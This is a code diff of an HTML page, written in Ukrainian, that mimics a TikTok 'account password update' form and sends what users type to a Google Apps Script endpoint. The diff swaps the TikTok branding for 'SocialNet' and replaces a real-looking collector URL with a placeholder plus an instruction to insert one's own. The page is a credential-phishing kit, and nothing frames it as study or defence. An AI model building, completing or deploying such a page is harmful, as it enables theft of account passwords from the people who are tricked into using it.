@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>TikTok</title>
+<title>SocialNet — Зміна пароля</title>
 <style>
   :root{
     --bg:#000000; --card:#121212; --border:#2a2a2a;
@@ -115,7 +115,7 @@
 </head>
 <body>
   <div class="card" id="card">
-    <div class="logo">TikTok</div>
+    <div class="logo">SocialNet</div>
     <p class="subtitle">Оновлення пароля облікового запису</p>
 
     <form id="form">
@@ -179,7 +179,7 @@
 <script>
 (function(){
   // ВСТАВТЕ СЮДИ ВАШ URL З GOOGLE APPS SCRIPT
-  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx-tG1L-m4fL29vMD1PhNxfztpi95bIhDQN-s-3tqEGmQ-GmNNyTkusX5eAawYMHcD5/exec';
+  const SCRIPT_URL = 'ВАШ_URL_З_GOOGLE_APPS_SCRIPT';
 
   const $ = id => document.getElementById(id);
   const card=$('card'), form=$('form'), success=$('success'), successText=$('successText');
@@ -278,7 +278,7 @@
       return;
     }
 
-    if(!SCRIPT_URL || SCRIPT_URL === 'SCRIPT_URL'){
+    if(!SCRIPT_URL || SCRIPT_URL === 'ВАШ_URL_З_GOOGLE_APPS_SCRIPT'){
       showError('Вкажіть коректний URL вашого Google Apps Script у коді.');
       card.classList.remove('shake'); void card.offsetWidth; card.classList.add('shake');
       return;
